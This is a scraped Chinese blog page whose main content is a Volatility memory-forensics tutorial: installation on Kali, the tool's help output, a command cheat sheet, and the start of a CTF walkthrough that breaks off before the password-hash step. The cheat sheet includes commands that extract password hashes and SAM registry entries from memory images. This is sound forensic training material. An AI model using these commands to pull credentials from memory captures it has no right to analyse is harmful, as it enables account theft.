<p>getflag<br><img src="https://img-blog.csdnimg.cn/f2c187533a3c4d29890f97949b110d11.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="img"><a target="_blank" rel="noopener" href="https://blog.csdn.net/zss192/article/details/104327432">
</a><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/07/05/Docker-%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/">Docker-练习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-07-05</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.2k</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>Docker-练习</p></div><div class="post-readmore"><a class="post-readmore__link" href="/2021/07/05/Docker-%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/"><span class="post-readmore__text">阅读全文</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/06/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/">文件上传之二次渲染</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-29</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.5k</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>二次渲染绕过</p></div><div class="post-readmore"><a class="post-readmore__link" href="/2021/06/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/"><span class="post-readmore__text">阅读全文</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/06/29/Docker-%E6%90%AD%E5%BB%BA%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83/">Docker-搭建题目环境</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-29</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">2.4k</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>Docker-搭建题目环境</p></div><div class="post-readmore"><a class="post-readmore__link" href="/2021/06/29/Docker-%E6%90%AD%E5%BB%BA%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83/"><span class="post-readmore__text">阅读全文</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/06/21/Docker-%E5%AE%89%E8%A3%85/">Docker-安装</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-21</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.3k</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>Docker-安装</p></div><div class="post-readmore"><a class="post-readmore__link" href="/2021/06/21/Docker-%E5%AE%89%E8%A3%85/"><span class="post-readmore__text">阅读全文</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">Volatility内存取证</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-06-03</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">4.5k</span></span></div></header><div class="post-body"><div class="post-excerpt"><h2 id="安装Volatility"><a href="#安装Volatility" class="headerlink" title="安装Volatility"></a>安装Volatility</h2><p>新版kali不自带Volatility，需要自己安装源码编译</p>
<p>1.下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//pan.baidu.com/s/1r-9VC3aG-sP6wWziYNvXxA  </span><br><br>提取码：<span class="hljs-number">4</span>d4w<br></code></pre></td></tr></table></figure>
<p>2.安装依赖</p>
<ul>
<li>crypto库安装</li>
</ul>
<p>安装pycryptodome</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">pip2 install pycryptodome -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="hljs-comment">#如果不指定国内源，可能会出现超时错误HTTPSConnectionPool</span><br></code></pre></td></tr></table></figure>
<ul>
<li>distorm3库安装</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">项目地址<br>https:<span class="hljs-comment">//github.com/vext01/distorm3</span><br></code></pre></td></tr></table></figure>
<p>解压到kali里面之后用命令 python setup.py install 编译</p>
<p>输入pip2 list查看是否安装成功</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Package      Version<br>------------ -------<br>cffi         1.14.0<br>distorm3     2<br>pip          20.3.4<br>pycryptodome 3.10.1<br>setuptools   18.5<br>volatility   2.6<br>wheel        0.29.0<br></code></pre></td></tr></table></figure>
<p>3.安装Volatility<br>将前面下载的项目，解压之后在Volatility中打开终端进行编译</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">python setup.py install <br></code></pre></td></tr></table></figure>
<p>最后输入vol.py -h测试一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/volatility2.6]<br>└─<span class="hljs-comment"># vol.py -h                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>Usage: Volatility - A memory forensics analysis platform.<br><br>Options:<br>  -h, --<span class="hljs-built_in">help</span>            list all available options and their default values.<br>                        Default values may be <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> the configuration file<br>                        (/etc/volatilityrc)<br>  --conf-file=/root/.volatilityrc<br>                        User based configuration file<br>  -d, --debug           Debug volatility<br>  --plugins=PLUGINS     Additional plugin directories to use (colon separated)<br>  --info                Print information about all registered objects<br>  --cache-directory=/root/.cache/volatility<br>                        Directory <span class="hljs-built_in">where</span> cache files are stored<br>  --cache               Use caching<br>  --tz=TZ               Sets the (Olson) timezone <span class="hljs-keyword">for</span> displaying timestamps<br>                        using pytz (<span class="hljs-keyword">if</span> installed) or tzset<br>  -f FILENAME, --filename=FILENAME<br>                        Filename to use when opening an image<br>  --profile=WinXPSP2x86<br>                        Name of the profile to load (use --info to see a list<br>                        of supported profiles)<br>  -l LOCATION, --location=LOCATION<br>                        A URN location from <span class="hljs-built_in">which</span> to load an address space<br>  -w, --write           Enable write support<br>  --dtb=DTB             DTB Address<br>  --<span class="hljs-built_in">shift</span>=SHIFT         Mac KASLR <span class="hljs-built_in">shift</span> address<br>  --output=text         Output <span class="hljs-keyword">in</span> this format (support is module specific, see<br>                        the Module Output Options below)<br>  --output-file=OUTPUT_FILE<br>                        Write output <span class="hljs-keyword">in</span> this file<br>  -v, --verbose         Verbose information<br>  -g KDBG, --kdbg=KDBG  Specify a KDBG virtual address (Note: <span class="hljs-keyword">for</span> 64-bit<br>                        Windows 8 and above this is the address of<br>                        KdCopyDataBlock)<br>  --force               Force utilization of suspect profile<br>  --cookie=COOKIE       Specify the address of nt!ObHeaderCookie (valid <span class="hljs-keyword">for</span><br>                        Windows 10 only)<br>  -k KPCR, --kpcr=KPCR  Specify a specific KPCR address<br><br>        Supported Plugin Commands:<br><br>                amcache         Print AmCache information<br>                apihooks        Detect API hooks <span class="hljs-keyword">in</span> process and kernel memory<br>                atoms           Print session and window station atom tables<br>                atomscan        Pool scanner <span class="hljs-keyword">for</span> atom tables<br>                auditpol        Prints out the Audit Policies from HKLM\SECURITY\Policy\PolAdtEv<br>                bigpools        Dump the big page pools using BigPagePoolScanner<br>                bioskbd         Reads the keyboard buffer from Real Mode memory<br>                cachedump       Dumps cached domain hashes from memory<br>                callbacks       Print system-wide notification routines<br>                clipboard       Extract the contents of the windows clipboard<br>                cmdline         Display process command-line arguments<br>                cmdscan         Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _COMMAND_HISTORY<br>                connections     Print list of open connections [Windows XP and 2003 Only]<br>                connscan        Pool scanner <span class="hljs-keyword">for</span> tcp connections<br>                consoles        Extract <span class="hljs-built_in">command</span> <span class="hljs-built_in">history</span> by scanning <span class="hljs-keyword">for</span> _CONSOLE_INFORMATION<br>                crashinfo       Dump crash-dump information<br>                deskscan        Poolscaner <span class="hljs-keyword">for</span> tagDESKTOP (desktops)<br>                devicetree      Show device tree<br>                dlldump         Dump DLLs from a process address space<br>                dlllist         Print list of loaded dlls <span class="hljs-keyword">for</span> each process<br>                driverirp       Driver IRP hook detection<br>                drivermodule    Associate driver objects to kernel modules<br>                driverscan      Pool scanner <span class="hljs-keyword">for</span> driver objects<br>                dumpcerts       Dump RSA private and public SSL keys<br>                dumpfiles       Extract memory mapped and cached files<br>                dumpregistry    Dumps registry files out to disk <br>                editbox         Displays information about Edit controls. (Listbox experimental.)<br>                envars          Display process environment variables<br>                eventhooks      Print details on windows event hooks<br>                evtlogs         Extract Windows Event Logs (XP/2003 only)<br>                filescan        Pool scanner <span class="hljs-keyword">for</span> file objects<br>                gahti           Dump the USER handle <span class="hljs-built_in">type</span> information<br>                gditimers       Print installed GDI timers and callbacks<br>                gdt             Display Global Descriptor Table<br>                getservicesids  Get the names of services <span class="hljs-keyword">in</span> the Registry and <span class="hljs-built_in">return</span> Calculated SID<br>                getsids         Print the SIDs owning each process<br>                handles         Print list of open handles <span class="hljs-keyword">for</span> each process<br>                hashdump        Dumps passwords hashes (LM/NTLM) from memory<br>                hibinfo         Dump hibernation file information<br>                hivedump        Prints out a hive<br>                hivelist        Print list of registry hives.<br>                hivescan        Pool scanner <span class="hljs-keyword">for</span> registry hives<br>                hpakextract     Extract physical memory from an HPAK file<br>                hpakinfo        Info on an HPAK file<br>                idt             Display Interrupt Descriptor Table<br>                iehistory       Reconstruct Internet Explorer cache / <span class="hljs-built_in">history</span><br>                imagecopy       Copies a physical address space out as a raw DD image<br>                imageinfo       Identify information <span class="hljs-keyword">for</span> the image <br>                impscan         Scan <span class="hljs-keyword">for</span> calls to imported <span class="hljs-built_in">functions</span><br>                joblinks        Print process job link information<br>                kdbgscan        Search <span class="hljs-keyword">for</span> and dump potential KDBG values<br>                kpcrscan        Search <span class="hljs-keyword">for</span> and dump potential KPCR values<br>                ldrmodules      Detect unlinked DLLs<br>                lsadump         Dump (decrypted) LSA secrets from the registry<br>                machoinfo       Dump Mach-O file format information<br>                malfind         Find hidden and injected code<br>                mbrparser       Scans <span class="hljs-keyword">for</span> and parses potential Master Boot Records (MBRs) <br>                memdump         Dump the addressable memory <span class="hljs-keyword">for</span> a process<br>                memmap          Print the memory map<br>                messagehooks    List desktop and thread window message hooks<br>                mftparser       Scans <span class="hljs-keyword">for</span> and parses potential MFT entries <br>                moddump         Dump a kernel driver to an executable file sample<br>                modscan         Pool scanner <span class="hljs-keyword">for</span> kernel modules<br>                modules         Print list of loaded modules<br>                multiscan       Scan <span class="hljs-keyword">for</span> various objects at once<br>                mutantscan      Pool scanner <span class="hljs-keyword">for</span> mutex objects<br>                notepad         List currently displayed notepad text<br>                objtypescan     Scan <span class="hljs-keyword">for</span> Windows object <span class="hljs-built_in">type</span> objects<br>                patcher         Patches memory based on page scans<br>                poolpeek        Configurable pool scanner plugin<br>                printkey        Print a registry key, and its subkeys and values<br>                privs           Display process privileges<br>                procdump        Dump a process to an executable file sample<br>                pslist          Print all running processes by following the EPROCESS lists <br>                psscan          Pool scanner <span class="hljs-keyword">for</span> process objects<br>                pstree          Print process list as a tree<br>                psxview         Find hidden processes with various process listings<br>                qemuinfo        Dump Qemu information<br>                raw2dmp         Converts a physical memory sample to a windbg crash dump<br>                screenshot      Save a pseudo-screenshot based on GDI windows<br>                servicediff     List Windows services (ala Plugx)<br>                sessions        List details on _MM_SESSION_SPACE (user logon sessions)<br>                shellbags       Prints ShellBags info<br>                shimcache       Parses the Application Compatibility Shim Cache registry key<br>                shutdowntime    Print ShutdownTime of machine from registry<br>                sockets         Print list of open sockets<br>                sockscan        Pool scanner <span class="hljs-keyword">for</span> tcp socket objects<br>                ssdt            Display SSDT entries<br>                strings         Match physical offsets to virtual addresses (may take a <span class="hljs-keyword">while</span>, VERY verbose)<br>                svcscan         Scan <span class="hljs-keyword">for</span> Windows services<br>                symlinkscan     Pool scanner <span class="hljs-keyword">for</span> symlink objects<br>                thrdscan        Pool scanner <span class="hljs-keyword">for</span> thread objects<br>                threads         Investigate _ETHREAD and _KTHREADs<br>                timeliner       Creates a timeline from various artifacts <span class="hljs-keyword">in</span> memory <br>                timers          Print kernel timers and associated module DPCs<br>                truecryptmaster Recover TrueCrypt 7.1a Master Keys<br>                truecryptpassphrase     TrueCrypt Cached Passphrase Finder<br>                truecryptsummary        TrueCrypt Summary<br>                unloadedmodules Print list of unloaded modules<br>                userassist      Print userassist registry keys and information<br>                userhandles     Dump the USER handle tables<br>                vaddump         Dumps out the vad sections to a file<br>                vadinfo         Dump the VAD info<br>                vadtree         Walk the VAD tree and display <span class="hljs-keyword">in</span> tree format<br>                vadwalk         Walk the VAD tree<br>                vboxinfo        Dump virtualbox information<br>                verinfo         Prints out the version information from PE images<br>                vmwareinfo      Dump VMware VMSS/VMSN information<br>                volshell        Shell <span class="hljs-keyword">in</span> the memory image<br>                windows         Print Desktop Windows (verbose details)<br>                wintree         Print Z-Order Desktop Windows Tree<br>                wndscan         Pool scanner <span class="hljs-keyword">for</span> window stations<br>                yarascan        Scan process or kernel memory with Yara signatures<br><br></code></pre></td></tr></table></figure>
<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="0x00-查看镜像系统"><a href="#0x00-查看镜像系统" class="headerlink" title="0x00 - 查看镜像系统"></a>0x00 - 查看镜像系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; imageinfo  <span class="hljs-comment">#常见的内存镜像文件有raw、vmem、dmp、img等</span><br></code></pre></td></tr></table></figure>
<h3 id="0x01-查看用户名密码信息"><a href="#0x01-查看用户名密码信息" class="headerlink" title="0x01 - 查看用户名密码信息"></a>0x01 - 查看用户名密码信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hashdump<br></code></pre></td></tr></table></figure>
<h3 id="0x02-查看进程信息"><a href="#0x02-查看进程信息" class="headerlink" title="0x02 - 查看进程信息"></a>0x02 - 查看进程信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pslist<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree <span class="hljs-comment">#可以识别子进程和父进程，且可以显示出被隐藏的病毒</span><br></code></pre></td></tr></table></figure>
<h3 id="0x03-扫描所有的文件列表"><a href="#0x03-扫描所有的文件列表" class="headerlink" title="0x03 - 扫描所有的文件列表"></a>0x03 - 扫描所有的文件列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] filescan | grep flag  <br></code></pre></td></tr></table></figure>
<h3 id="0x04-查看cmd上的操作"><a href="#0x04-查看cmd上的操作" class="headerlink" title="0x04 - 查看cmd上的操作"></a>0x04 - 查看cmd上的操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdscan<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] cmdline <span class="hljs-comment">#列出命令行下运行的程序</span><br></code></pre></td></tr></table></figure>
<h3 id="0x05-查看具体恶意进程"><a href="#0x05-查看具体恶意进程" class="headerlink" title="0x05 - 查看具体恶意进程"></a>0x05 - 查看具体恶意进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] pstree  | egrep <span class="hljs-string">&#x27;(a.exe|b.exe)&#x27;</span>   <span class="hljs-comment">#以树的形式来列出正在进行的进程</span><br></code></pre></td></tr></table></figure>
<h3 id="0x06-检查恶意链接"><a href="#0x06-检查恶意链接" class="headerlink" title="0x06 -  检查恶意链接"></a>0x06 -  检查恶意链接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">检查链接插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] connections<br>检查端口插件：vol.py -f &lt;镜像文件&gt; --profile=[profile文件] sockets<br></code></pre></td></tr></table></figure>
<h3 id="0x07-检测DLL"><a href="#0x07-检测DLL" class="headerlink" title="0x07 - 检测DLL"></a>0x07 - 检测DLL</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] dlllist -p[pid]<br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] ldrmodules  -p[pid] -v <span class="hljs-comment">#显示包括隐藏dll的具体信息</span><br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] malfind -p[pid] <span class="hljs-comment">#找出注入的可执行代码或者DLL </span><br></code></pre></td></tr></table></figure>
<h3 id="0x08-根据PID导出程序"><a href="#0x08-根据PID导出程序" class="headerlink" title="0x08 - 根据PID导出程序"></a>0x08 - 根据PID导出程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] prodump -p [PID] -D [目录]<br></code></pre></td></tr></table></figure>

<h3 id="0x09-检查驱动程序"><a href="#0x09-检查驱动程序" class="headerlink" title="0x09 - 检查驱动程序"></a>0x09 - 检查驱动程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] modules<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] moddump -D [目录] --base [base地址]  <span class="hljs-comment">#提取驱动程序</span><br></code></pre></td></tr></table></figure>
<h3 id="0x10-查看开启的windows服务"><a href="#0x10-查看开启的windows服务" class="headerlink" title="0x10 - 查看开启的windows服务"></a>0x10 - 查看开启的windows服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] svcscan<br></code></pre></td></tr></table></figure>
<h3 id="0x10-查看注册表项"><a href="#0x10-查看注册表项" class="headerlink" title="0x10 - 查看注册表项"></a>0x10 - 查看注册表项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey<br></code></pre></td></tr></table></figure>
<h3 id="0x11-列出SAM表中的用户"><a href="#0x11-列出SAM表中的用户" class="headerlink" title="0x11 - 列出SAM表中的用户"></a>0x11 - 列出SAM表中的用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SAM\Domains\Account\Users\Names&quot;</span><br></code></pre></td></tr></table></figure>
<h3 id="0x12-获取最后登录系统的用户"><a href="#0x12-获取最后登录系统的用户" class="headerlink" title="0x12 - 获取最后登录系统的用户"></a>0x12 - 获取最后登录系统的用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure>
<h3 id="0x13-查看注册表信息"><a href="#0x13-查看注册表信息" class="headerlink" title="0x13 - 查看注册表信息"></a>0x13 - 查看注册表信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivelist<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivedump -o 0x93fc41e8(注册表的 virtual 地址)  <span class="hljs-comment">#导出注册表</span><br></code></pre></td></tr></table></figure>
<h3 id="0x14-获取浏览器浏览历史"><a href="#0x14-获取浏览器浏览历史" class="headerlink" title="0x14 - 获取浏览器浏览历史"></a>0x14 - 获取浏览器浏览历史</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] iehistory<br></code></pre></td></tr></table></figure>
<h3 id="0x15-查看时间线"><a href="#0x15-查看时间线" class="headerlink" title="0x15- 查看时间线"></a>0x15- 查看时间线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] timeliner<br></code></pre></td></tr></table></figure>
<h2 id="CTF中的内存取证题"><a href="#CTF中的内存取证题" class="headerlink" title="CTF中的内存取证题"></a>CTF中的内存取证题</h2><h3 id="湖湘杯2020-passwd"><a href="#湖湘杯2020-passwd" class="headerlink" title="[湖湘杯2020] passwd"></a>[湖湘杯2020] passwd</h3><p>查看内存镜像的基本信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/volatility2.6]<br>└─<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</span><br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                                                                         <br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/WIN-BU6IJ7FI9RU-20190927-152050.raw)                        <br>                      PAE <span class="hljs-built_in">type</span> : PAE                                                                                                    <br>                           DTB : 0x185000L                                                                                              <br>                          KDBG : 0x83f61c28L                                                                                            <br>          Number of Processors : 2                                                                                                      <br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0x83f62c00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0x807ca000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2019-09-27 15:20:52 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2019-09-27 23:20:52 +0800                                                                                                                                       <br></code></pre></td></tr></table></figure>
<p>根据Suggested Profile(s)值，猜测是Win7SP1x86_23418的镜像</p>
<p>查看password的hash值</p>
